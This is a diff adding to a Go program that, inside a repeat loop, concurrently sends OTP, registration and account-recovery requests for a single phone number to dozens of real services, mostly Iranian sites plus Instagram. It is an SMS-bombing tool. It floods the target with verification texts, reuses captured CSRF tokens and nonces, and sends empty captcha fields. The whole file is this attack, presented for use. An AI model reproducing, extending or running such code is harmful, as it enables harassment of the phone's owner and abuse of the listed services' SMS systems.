@@ -167,8 +167,638 @@ func main() {
 	}
 
 	for i := 0; i < repeatCount; i++ {
+		// APIs from the latest provided list
 
+		// abantether.com (JSON) - users/register/phone/send/ (Duplicate URL base, new payload format)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://abantether.com/users/register/phone/send/", map[string]interface{}{
+			"phoneNumber": phone,
+			"email": "",
+		}, &wg, ch)
 
+		// flightio.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": fmt.Sprintf("98-%s", phone),
+			"userKeyType": 1,
+		}, &wg, ch)
+
+		// shadmessenger12.iranlms.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://shadmessenger12.iranlms.ir/", map[string]interface{}{
+			"api_version": "3",
+			"method": "sendCode",
+			"data": map[string]interface{}{
+				"phone_number": phone,
+				"send_type": "SMS",
+			},
+		}, &wg, ch)
+
+		// agent.wide-app.ir (JSON) - Duplicate URL base, new payload format
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://agent.wide-app.ir/auth/token", map[string]interface{}{
+			"grant_type": "otp",
+			"client_id": "62b30c4af53e3b0cf100a4a0",
+			"phone": phone,
+		}, &wg, ch)
+
+		// apollo.digify.shop (JSON) - GraphQL endpoint
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://apollo.digify.shop/graphql", map[string]interface{}{
+			"operationName": "Mutation",
+			"variables": map[string]interface{}{
+				"content": map[string]interface{}{
+					"phone_number": phone,
+				},
+			},
+			"query": "mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}",
+		}, &wg, ch)
+
+		// auth.mrbilit.com (JSON) - Note: URL has query params
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail=%v&source=2&sendTokenIfNot=true", phone), map[string]interface{}{
+			"mobileOrEmail": phone, // Assuming the key matches the URL parameter
+		}, &wg, ch)
+
+		// api.chartex.net (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.chartex.net/api/v2/user/validate", map[string]interface{}{
+			"mobile": phone,
+			"country_code": "IR",
+			"provider_code": "RUBIKA",
+		}, &wg, ch)
+
+		// www.snapptrip.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://www.snapptrip.com/register", map[string]interface{}{
+			"lang": "fa",
+			"country_id": "860",
+			"password": "snaptrippass", // Note: Sending a fixed password might not be intended
+			"mobile_phone": phone,
+			"country_code": "+98",
+			"email": "example@gmail.com", // Note: Sending a fixed email might not be intended
+		}, &wg, ch)
+
+		// api-v2.filmnet.ir (JSON) - Note: URL has {phone} placeholder
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://api-v2.filmnet.ir/access-token/users/%v/otp", phone), map[string]interface{}{
+			"phone": phone, // Assuming a standard key like "phone"
+		}, &wg, ch)
+
+		// api.bitpin.ir (JSON) - Duplicate URL base, new payload format
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
+			"phone": phone,
+			"captcha_token": "",
+		}, &wg, ch)
+
+		// chamedoon.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", map[string]interface{}{
+			"mobile": phone,
+			"origin": "/",
+			"referrer_id": "",
+		}, &wg, ch)
+
+		// api.raybit.net (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.raybit.net:3111/api/v1/authentication/register/mobile", map[string]interface{}{
+			"mobile": phone,
+			"side": "web",
+		}, &wg, ch)
+
+		// api.torob.com (JSON) - send-pin (New path) - Note: URL has query params
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", phone), map[string]interface{}{
+			"phone_number": phone, // Assuming this is still the payload key
+		}, &wg, ch)
+
+		// www.namava.ir (JSON) - registrations/by-phone/request (Duplicate URL base, different path)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", map[string]interface{}{
+			"UserName": phone,
+		}, &wg, ch)
+
+		// gw.taaghche.com (JSON) - signup (Duplicate, keeping as provided)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
+			"contact": phone,
+		}, &wg, ch)
+
+		// core.gap.im (JSON) - Note: URL has query params
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://core.gap.im/v1/user/add.json?mobile=%2B%s", phone), map[string]interface{}{
+			"mobile": phone, // Assuming a standard key like "mobile"
+		}, &wg, ch)
+
+		// app.mydigipay.com (JSON) - Duplicate URL base, new payload format
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://app.mydigipay.com/digipay/api/users/send-sms", map[string]interface{}{
+			"cellNumber": phone,
+			"device": map[string]interface{}{
+				"deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f",
+				"deviceModel": "WEB_BROWSER",
+				"deviceAPI": "WEB_BROWSER",
+				"osName": "WEB",
+			},
+		}, &wg, ch)
+
+		// gateway.wisgoon.com (JSON) - Note: Complex payload with headers
+		wg.Add(1)
+		// Note: Headers are not included in sendJSONRequest, only payload is sent.
+		// The recaptcha-response token is likely dynamic and this request might fail without a valid one.
+		go sendJSONRequest(ctx, "https://gateway.wisgoon.com/api/v1/auth/login/", map[string]interface{}{
+			"phone": phone,
+			"recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg", // This token is likely expired/invalid
+			"token": "e622c330c77a17c8426e638d7a85da6c2ec9f455", // This token is likely expired/invalid
+		}, &wg, ch)
+
+		// tagmond.com (Form Data) - Note: Includes recaptcha parameter
+		wg.Add(1)
+		formDataTagmond := url.Values{}
+		formDataTagmond.Set("utf8", "✓") // Unicode checkmark
+		formDataTagmond.Set("phone_number", phone)
+		formDataTagmond.Set("g-recaptcha-response", "") // Recaptcha response is likely needed
+		go sendFormRequest(ctx, "https://tagmond.com/phone_number", formDataTagmond, &wg, ch)
+
+		// api.doctoreto.com (JSON) - Duplicate URL base, new payload format
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
+			"mobile": phone,
+			"country_id": 205,
+		}, &wg, ch)
+
+		// api.anargift.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.anargift.com/api/people/auth", map[string]interface{}{
+			"user": phone,
+			"app_id": 99,
+		}, &wg, ch)
+
+		// azki.com (JSON) - Note: URL has {phoneNumber} placeholder (Duplicate URL base, new path/payload)
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://www.azki.com/api/core/app/user/checkLoginAvailability/{'phoneNumber':'azki_%v'}", phone), map[string]interface{}{
+			"phoneNumber": fmt.Sprintf("azki_%v", phone), // Assuming payload matches URL structure
+		}, &wg, ch)
+
+		// lendo.ir (Form Data) - Note: Includes token and password
+		wg.Add(1)
+		formDataLendo := url.Values{}
+		formDataLendo.Set("_token", "mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6") // Token is likely dynamic
+		formDataLendo.Set("mobile", phone)
+		formDataLendo.Set("password", "ibvvb@3#9nc") // Note: Sending a fixed password might not be intended
+		go sendFormRequest(ctx, "https://lendo.ir/register?", formDataLendo, &wg, ch)
+
+		// www.olgoobooks.ir (Form Data) - Note: Complex payload with nested keys
+		wg.Add(1)
+		formDataOlgoo := url.Values{}
+		formDataOlgoo.Set("contactInfo[mobile]", phone)
+		formDataOlgoo.Set("contactInfo[agreementAccepted]", "1")
+		formDataOlgoo.Set("contactInfo[teachingFieldId]", "1")
+		formDataOlgoo.Set("contactInfo[eduGradeIds][7]", "7")
+		formDataOlgoo.Set("submit_register", "1")
+		go sendFormRequest(ctx, "https://www.olgoobooks.ir/sn/userRegistration/?&requestedByAjax=1&elementsId=userRegisterationBox", formDataOlgoo, &wg, ch)
+
+		// www.pakhsh.shop (Form Data) - Note: Includes csrf token and captcha
+		wg.Add(1)
+		formDataPakhsh := url.Values{}
+		formDataPakhsh.Set("action", "digits_check_mob")
+		formDataPakhsh.Set("countrycode", "+98")
+		formDataPakhsh.Set("mobileNo", phone)
+		formDataPakhsh.Set("csrf", "fdaa7fc8e6") // CSRF token is likely dynamic
+		formDataPakhsh.Set("login", "2")
+		formDataPakhsh.Set("username", "")
+		formDataPakhsh.Set("email", "")
+		formDataPakhsh.Set("captcha", "") // Captcha is likely needed
+		formDataPakhsh.Set("captcha_ses", "")
+		formDataPakhsh.Set("digits", "1")
+		formDataPakhsh.Set("json", "1")
+		formDataPakhsh.Set("whatsapp", "0")
+		go sendFormRequest(ctx, "https://www.pakhsh.shop/wp-admin/admin-ajax.php", formDataPakhsh, &wg, ch)
+
+		// api.basalam.com (JSON) - Duplicate URL base, new path/payload
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.basalam.com/user", map[string]interface{}{
+			"variables": map[string]interface{}{
+				"mobile": phone,
+			},
+			"query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }",
+		}, &wg, ch)
+
+		// crm.see5.net (Form Data)
+		wg.Add(1)
+		formDataSee5 := url.Values{}
+		formDataSee5.Set("mobile", phone)
+		formDataSee5.Set("action", "sendsms")
+		go sendFormRequest(ctx, "https://crm.see5.net/api_ajax/sendotp.php", formDataSee5, &wg, ch)
+
+		// www.simkhanapi.ir (JSON) - Duplicate URL base, new payload format
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://www.simkhanapi.ir/api/users/registerV2", map[string]interface{}{
+			"mobileNumber": phone,
+			"ReSendSMS": "False",
+		}, &wg, ch)
+
+		// my.limoome.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://my.limoome.com/api/auth/login/otp", map[string]interface{}{
+			"mobileNumber": phone,
+			"country": "1",
+		}, &wg, ch)
+
+		// www.mihanpezeshk.com (Form Data) - Note: Includes token and recaptcha
+		wg.Add(1)
+		formDataMihan := url.Values{}
+		formDataMihan.Set("_token", "bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R") // Token is likely dynamic
+		formDataMihan.Set("mobile", phone)
+		formDataMihan.Set("recaptcha", "") // Recaptcha is likely needed
+		go sendFormRequest(ctx, "https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient", formDataMihan, &wg, ch)
+
+		// i.devslop.app (Form Data)
+		wg.Add(1)
+		formDataDevslop := url.Values{}
+		formDataDevslop.Set("number", phone)
+		formDataDevslop.Set("state", "number")
+		go sendFormRequest(ctx, "https://i.devslop.app/app/ifollow/api/otp.php/", formDataDevslop, &wg, ch)
+
+		// behzadshami.com (Form Data) - Note: Complex payload with csrf token and other fields
+		wg.Add(1)
+		formDataBehzad := url.Values{}
+		formDataBehzad.Set("action", "digits_check_mob")
+		formDataBehzad.Set("countrycode", "+98")
+		formDataBehzad.Set("mobileNo", phone)
+		formDataBehzad.Set("csrf", "3b4194a8bb") // CSRF token is likely dynamic
+		formDataBehzad.Set("login", "2")
+		formDataBehzad.Set("username", "")
+		formDataBehzad.Set("email", "")
+		formDataBehzad.Set("captcha", "")
+		formDataBehzad.Set("captcha_ses", "")
+		formDataBehzad.Set("digits", "1")
+		formDataBehzad.Set("json", "1")
+		formDataBehzad.Set("whatsapp", "0")
+		formDataBehzad.Set("digits_reg_فیلدمتنی1642498931181", "Nvgu") // Note: Non-standard key
+		formDataBehzad.Set("digregcode", "+98")
+		formDataBehzad.Set("digits_reg_mail", phone)
+		formDataBehzad.Set("dig_otp", "")
+		formDataBehzad.Set("code", "")
+		formDataBehzad.Set("dig_reg_mail", "")
+		formDataBehzad.Set("dig_nounce", "3b4194a8bb") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://behzadshami.com/wp-admin/admin-ajax.php", formDataBehzad, &wg, ch)
+
+		// restaurant.delino.com (JSON) - Duplicate URL base, new payload format
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://restaurant.delino.com/user/register", map[string]interface{}{
+			"apiToken":     "VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq", // Token is likely dynamic
+			"clientSecret": "7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq", // Secret is likely dynamic
+			"device":       "web",
+			"username":     phone,
+		}, &wg, ch)
+
+		// shop.tnovin.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "http://shop.tnovin.com/login", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+
+		// dastkhat-isad.ir (JSON) - Duplicate URL base, new payload format
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{
+			"mobile": phone,
+			"countryCode": 98,
+			"device_os": 2,
+		}, &wg, ch)
+
+		// hamlex.ir (Form Data)
+		wg.Add(1)
+		formDataHamlex := url.Values{}
+		formDataHamlex.Set("fullname", "ممد") // Note: Fixed name
+		formDataHamlex.Set("phoneNumber", phone)
+		formDataHamlex.Set("register", "")
+		go sendFormRequest(ctx, "https://hamlex.ir/register.php", formDataHamlex, &wg, ch)
+
+		// moshaveran724.ir (Form Data)
+		wg.Add(1)
+		formDataMoshaveran := url.Values{}
+		formDataMoshaveran.Set("againkey", phone) // Assuming this is the phone number key
+		formDataMoshaveran.Set("cache", "false")
+		go sendFormRequest(ctx, "https://moshaveran724.ir/m/pms.php", formDataMoshaveran, &wg, ch)
+
+		// app.flightio.com (JSON) - Duplicate URL base, new payload format
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://app.flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
+			"userKey": phone, // Assuming this is the key
+			"userKeyType": 1,
+		}, &wg, ch)
+
+		// www.foodcenter.ir (Form Data) - Note: Includes token
+		wg.Add(1)
+		formDataFoodcenter := url.Values{}
+		formDataFoodcenter.Set("mobile", phone)
+		formDataFoodcenter.Set("__RequestVerificationToken", "lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1") // Token is likely dynamic
+		go sendFormRequest(ctx, "https://www.foodcenter.ir/account/sabtmobile", formDataFoodcenter, &wg, ch)
+
+		// auth.homtick.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://auth.homtick.com/api/V1/User/GetVerifyCode", map[string]interface{}{
+			"mobileOrEmail": phone,
+			"deviceCode": "d520c7a8-421b-4563-b955-f5abc56b97ec", // Device code is likely dynamic
+			"firstName": "",
+			"lastName": "",
+			"password": "",
+		}, &wg, ch)
+
+		// app.kardoon.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://app.kardoon.ir:4433/api/users", map[string]interface{}{
+			"optype": 15,
+			"userid": 0,
+			"mobile": phone,
+			"firstname": "",
+			"lastname": "",
+			"cityid": 0,
+			"email": "",
+			"birthdate": "",
+			"gender": "False",
+			"avatarid": 0,
+			"packagename": "",
+			"versioncode": -1,
+			"tokenkey": "",
+			"username": "",
+			"password": "",
+			"connectionname": "MainConStr",
+		}, &wg, ch)
+
+		// abantether.com (JSON) - users/register/phone/send/ (Duplicate URL base, new payload format)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://abantether.com/users/register/phone/send/", map[string]interface{}{
+			"phoneNumber": phone,
+			"email": "",
+		}, &wg, ch)
+
+		// amoomilad.demo-hoonammaharat.ir (JSON) - Note: Includes token and helper
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode", map[string]interface{}{
+			"Token": "5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c", // Token is likely dynamic
+			"DeviceId": 1,
+			"PhoneNumber": phone,
+			"Helper": 77942, // Helper value is likely dynamic
+		}, &wg, ch)
+
+		// ashraafi.com (Form Data) - Note: Includes csrf token and other fields
+		wg.Add(1)
+		formDataAshraafi := url.Values{}
+		formDataAshraafi.Set("action", "digits_check_mob")
+		formDataAshraafi.Set("countrycode", "+98")
+		formDataAshraafi.Set("mobileNo", phone)
+		formDataAshraafi.Set("csrf", "54dfdabe34") // CSRF token is likely dynamic
+		formDataAshraafi.Set("login", "1")
+		formDataAshraafi.Set("username", "")
+		formDataAshraafi.Set("email", "")
+		formDataAshraafi.Set("captcha", "")
+		formDataAshraafi.Set("captcha_ses", "")
+		formDataAshraafi.Set("digits", "1")
+		formDataAshraafi.Set("json", "1")
+		formDataAshraafi.Set("whatsapp", "0")
+		formDataAshraafi.Set("mobmail", phone) // Assuming this is the mobile field
+		formDataAshraafi.Set("dig_otp", "")
+		formDataAshraafi.Set("dig_nounce", "54dfdabe34") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://ashraafi.com/wp-admin/admin-ajax.php", formDataAshraafi, &wg, ch)
+
+		// bandarazad.com (Form Data) - Note: Includes csrf token, password, and other fields
+		wg.Add(1)
+		formDataBandarazad := url.Values{}
+		formDataBandarazad.Set("action", "digits_check_mob")
+		formDataBandarazad.Set("countrycode", "+98")
+		formDataBandarazad.Set("mobileNo", phone)
+		formDataBandarazad.Set("csrf", "ec10ccb02a") // CSRF token is likely dynamic
+		formDataBandarazad.Set("login", "2")
+		formDataBandarazad.Set("username", "")
+		formDataBandarazad.Set("email", "")
+		formDataBandarazad.Set("captcha", "")
+		formDataBandarazad.Set("captcha_ses", "")
+		formDataBandarazad.Set("digits", "1")
+		formDataBandarazad.Set("json", "1")
+		formDataBandarazad.Set("whatsapp", "0")
+		formDataBandarazad.Set("digregcode", "+98")
+		formDataBandarazad.Set("digits_reg_mail", phone) // Assuming this is the mobile field
+		formDataBandarazad.Set("digits_reg_password", "fuckYOU") // Note: Fixed password
+		formDataBandarazad.Set("dig_otp", "")
+		formDataBandarazad.Set("code", "")
+		formDataBandarazad.Set("dig_reg_mail", "")
+		formDataBandarazad.Set("dig_nounce", "ec10ccb02a") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://bandarazad.com/wp-admin/admin-ajax.php", formDataBandarazad, &wg, ch)
+
+		// bazidone.com (Form Data) - Note: Includes csrf token and other fields
+		wg.Add(1)
+		formDataBazidone := url.Values{}
+		formDataBazidone.Set("action", "digits_check_mob")
+		formDataBazidone.Set("countrycode", "+98")
+		formDataBazidone.Set("mobileNo", phone)
+		formDataBazidone.Set("csrf", "c0f5d0dcf2") // CSRF token is likely dynamic
+		formDataBazidone.Set("login", "1")
+		formDataBazidone.Set("username", "")
+		formDataBazidone.Set("email", "")
+		formDataBazidone.Set("captcha", "")
+		formDataBazidone.Set("captcha_ses", "")
+		formDataBazidone.Set("digits", "1")
+		formDataBazidone.Set("json", "1")
+		formDataBazidone.Set("whatsapp", "0")
+		formDataBazidone.Set("mobmail", phone) // Assuming this is the mobile field
+		formDataBazidone.Set("dig_otp", "")
+		formDataBazidone.Set("digits_login_remember_me", "1")
+		formDataBazidone.Set("dig_nounce", "c0f5d0dcf2") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://bazidone.com/wp-admin/admin-ajax.php", formDataBazidone, &wg, ch)
+
+		// www.bigtoys.ir (Form Data) - Note: Includes csrf token and other fields
+		wg.Add(1)
+		formDataBigtoys := url.Values{}
+		formDataBigtoys.Set("action", "digits_check_mob")
+		formDataBigtoys.Set("countrycode", "+98")
+		formDataBigtoys.Set("mobileNo", phone)
+		formDataBigtoys.Set("csrf", "94cf3ad9a4") // CSRF token is likely dynamic
+		formDataBigtoys.Set("login", "2")
+		formDataBigtoys.Set("username", "")
+		formDataBigtoys.Set("email", "")
+		formDataBigtoys.Set("captcha", "")
+		formDataBigtoys.Set("captcha_ses", "")
+		formDataBigtoys.Set("digits", "1")
+		formDataBigtoys.Set("json", "1")
+		formDataBigtoys.Set("whatsapp", "0")
+		formDataBigtoys.Set("digits_reg_name", "بیبلیبل") // Note: Fixed name
+		formDataBigtoys.Set("digregcode", "+98")
+		formDataBigtoys.Set("digits_reg_mail", phone) // Assuming this is the mobile field
+		formDataBigtoys.Set("digregscode2", "+98")
+		formDataBigtoys.Set("mobmail2", "")
+		formDataBigtoys.Set("digits_reg_password", "")
+		formDataBigtoys.Set("dig_otp", "")
+		formDataBigtoys.Set("code", "")
+		formDataBigtoys.Set("dig_reg_mail", "")
+		formDataBigtoys.Set("dig_nounce", "94cf3ad9a4") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formDataBigtoys, &wg, ch)
+
+		// bitex24.com (JSON) - Note: URL has query params
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://bitex24.com/api/v1/auth/sendSms?mobile=%s&dial_code=0", phone), map[string]interface{}{
+			"mobile": phone, // Assuming this is also in the payload
+			"dial_code": 0, // Assuming this is also in the payload
+		}, &wg, ch)
+
+		// farsgraphic.com (Form Data) - Note: Complex payload with csrf token and other fields
+		wg.Add(1)
+		formDataFarsgraphic := url.Values{}
+		formDataFarsgraphic.Set("action", "digits_check_mob")
+		formDataFarsgraphic.Set("countrycode", "+98")
+		formDataFarsgraphic.Set("mobileNo", phone)
+		formDataFarsgraphic.Set("csrf", "79a35b4aa3") // CSRF token is likely dynamic
+		formDataFarsgraphic.Set("login", "2")
+		formDataFarsgraphic.Set("username", "")
+		formDataFarsgraphic.Set("email", "")
+		formDataFarsgraphic.Set("captcha", "")
+		formDataFarsgraphic.Set("captcha_ses", "")
+		formDataFarsgraphic.Set("digits", "1")
+		formDataFarsgraphic.Set("json", "1")
+		formDataFarsgraphic.Set("whatsapp", "0")
+		formDataFarsgraphic.Set("digits_reg_name", "نیمنمنمنیس") // Note: Fixed name
+		formDataFarsgraphic.Set("digits_reg_lastname", "منسیزتمن") // Note: Fixed last name
+		formDataFarsgraphic.Set("digregscode2", "+98")
+		formDataFarsgraphic.Set("mobmail2", "")
+		formDataFarsgraphic.Set("digregcode", "+98")
+		formDataFarsgraphic.Set("digits_reg_mail", phone) // Assuming this is the mobile field
+		formDataFarsgraphic.Set("dig_otp", "")
+		formDataFarsgraphic.Set("code", "")
+		formDataFarsgraphic.Set("dig_reg_mail", "")
+		formDataFarsgraphic.Set("dig_nounce", "79a35b4aa3") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://farsgraphic.com/wp-admin/admin-ajax.php", formDataFarsgraphic, &wg, ch)
+
+		// instagram.com (Form Data) - Note: Includes recaptcha field
+		wg.Add(1)
+		formDataInstagram := url.Values{}
+		formDataInstagram.Set("email_or_username", fmt.Sprintf("+%s", phone)) // Assuming + is needed here
+		formDataInstagram.Set("recaptcha_challenge_field", "") // Recaptcha is likely needed
+		formDataInstagram.Set("flow", "")
+		formDataInstagram.Set("app_id", "")
+		formDataInstagram.Set("source_account_id", "")
+		go sendFormRequest(ctx, "https://www.instagram.com/accounts/account_recovery_send_ajax/", formDataInstagram, &wg, ch)
+
+		// shop.hemat-elec.ir (Form Data) - Note: Includes csrf token and password
+		wg.Add(1)
+		formDataHemat := url.Values{}
+		formDataHemat.Set("action", "digits_check_mob")
+		formDataHemat.Set("countrycode", "+98")
+		formDataHemat.Set("mobileNo", phone)
+		formDataHemat.Set("csrf", "d33076d828") // CSRF token is likely dynamic
+		formDataHemat.Set("login", "2")
+		formDataHemat.Set("username", "")
+		formDataHemat.Set("email", "")
+		formDataHemat.Set("captcha", "")
+		formDataHemat.Set("captcha_ses", "")
+		formDataHemat.Set("digits", "1")
+		formDataHemat.Set("json", "1")
+		formDataHemat.Set("whatsapp", "0")
+		formDataHemat.Set("digregscode2", "+98")
+		formDataHemat.Set("mobmail2", "")
+		formDataHemat.Set("digregcode", "+98")
+		formDataHemat.Set("digits_reg_mail", phone) // Assuming this is the mobile field
+		formDataHemat.Set("digits_reg_password", "mahyar125") // Note: Fixed password
+		formDataHemat.Set("dig_otp", "")
+		formDataHemat.Set("code", "")
+		formDataHemat.Set("dig_reg_mail", "")
+		formDataHemat.Set("dig_nounce", "d33076d828") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://shop.hemat-elec.ir/wp-admin/admin-ajax.php", formDataHemat, &wg, ch)
+
+		// www.mipersia.com (Form Data) - Note: Includes csrf token and other fields
+		wg.Add(1)
+		formDataMipersia := url.Values{}
+		formDataMipersia.Set("action", "digits_check_mob")
+		formDataMipersia.Set("countrycode", "+98")
+		formDataMipersia.Set("mobileNo", phone)
+		formDataMipersia.Set("csrf", "2d39af0a72") // CSRF token is likely dynamic
+		formDataMipersia.Set("login", "2")
+		formDataMipersia.Set("username", "")
+		formDataMipersia.Set("email", "")
+		formDataMipersia.Set("captcha", "")
+		formDataMipersia.Set("captcha_ses", "")
+		formDataMipersia.Set("digits", "1")
+		formDataMipersia.Set("json", "1")
+		formDataMipersia.Set("whatsapp", "0")
+		formDataMipersia.Set("digregcode", "+98")
+		formDataMipersia.Set("digits_reg_mail", phone) // Assuming this is the mobile field
+		formDataMipersia.Set("digregscode2", "+98")
+		formDataMipersia.Set("mobmail2", "")
+		formDataMipersia.Set("dig_otp", "")
+		formDataMipersia.Set("code", "")
+		formDataMipersia.Set("dig_reg_mail", "")
+		formDataMipersia.Set("dig_nounce", "2d39af0a72") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://www.mipersia.com/wp-admin/admin-ajax.php", formDataMipersia, &wg, ch)
+
+		// www.kodakamoz.com (Form Data) - Note: Complex payload with csrf token and other fields
+		wg.Add(1)
+		formDataKodakamoz := url.Values{}
+		formDataKodakamoz.Set("action", "digits_check_mob")
+		formDataKodakamoz.Set("countrycode", "+98")
+		formDataKodakamoz.Set("mobileNo", phone)
+		formDataKodakamoz.Set("csrf", "18551366bc") // CSRF token is likely dynamic
+		formDataKodakamoz.Set("login", "2")
+		formDataKodakamoz.Set("username", "")
+		formDataKodakamoz.Set("email", "")
+		formDataKodakamoz.Set("captcha", "")
+		formDataKodakamoz.Set("captcha_ses", "")
+		formDataKodakamoz.Set("digits", "1")
+		formDataKodakamoz.Set("json", "1")
+		formDataKodakamoz.Set("whatsapp", "0")
+		formDataKodakamoz.Set("digits_reg_lastname", "لببییبحثقح") // Note: Fixed value
+		formDataKodakamoz.Set("digits_reg_displayname", "بببیبربللیبل") // Note: Fixed value
+		formDataKodakamoz.Set("digregscode2", "+98")
+		formDataKodakamoz.Set("mobmail2", "")
+		formDataKodakamoz.Set("digregcode", "+98")
+		formDataKodakamoz.Set("digits_reg_mail", phone) // Assuming this is the mobile field
+		formDataKodakamoz.Set("digits_reg_password", "")
+		formDataKodakamoz.Set("digits_reg_avansbirthdate", "2003-03-21") // Note: Fixed date
+		formDataKodakamoz.Set("jalali_digits_reg_avansbirthdate1867119037", "1382-01-01") // Note: Fixed date
+		formDataKodakamoz.Set("dig_otp", "")
+		formDataKodakamoz.Set("code", "")
+		formDataKodakamoz.Set("dig_reg_mail", "")
+		formDataKodakamoz.Set("dig_nounce", "18551366bc") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://www.kodakamoz.com/wp-admin/admin-ajax.php", formDataKodakamoz, &wg, ch)
+
+		// tajtehran.com (Form Data) - Note: Includes password
+		wg.Add(1)
+		formDataTajtehran := url.Values{}
+		formDataTajtehran.Set("mobile", phone)
+		formDataTajtehran.Set("password", "mamad1234") // Note: Fixed password
+		go sendFormRequest(ctx, "https://tajtehran.com/RegisterRequest", formDataTajtehran, &wg, ch)
+
+		// zivanpet.com (Form Data) - Note: Includes csrf token
+		wg.Add(1)
+		formDataZivanpet := url.Values{}
+		formDataZivanpet.Set("action", "digits_check_mob")
+		formDataZivanpet.Set("countrycode", "+98")
+		formDataZivanpet.Set("mobileNo", phone)
+		formDataZivanpet.Set("csrf", "0864ed5c9b") // CSRF token is likely dynamic
+		formDataZivanpet.Set("login", "2")
+		formDataZivanpet.Set("username", "")
+		formDataZivanpet.Set("email", "")
+		formDataZivanpet.Set("captcha", "")
+		formDataZivanpet.Set("captcha_ses", "")
+		formDataZivanpet.Set("digits", "1")
+		formDataZivanpet.Set("json", "1")
+		formDataZivanpet.Set("whatsapp", "0")
+		formDataZivanpet.Set("digregcode", "+98")
+		formDataZivanpet.Set("digits_reg_mail", phone) // Assuming this is the mobile field
+		formDataZivanpet.Set("dig_otp", "")
+		formDataZivanpet.Set("code", "")
+		formDataZivanpet.Set("dig_reg_mail", "")
+		formDataZivanpet.Set("dig_nounce", "0864ed5c9b") // Nonce is likely dynamic
+		go sendFormRequest(ctx, "https://zivanpet.com/wp-admin/admin-ajax.php", formDataZivanpet, &wg, ch)
+
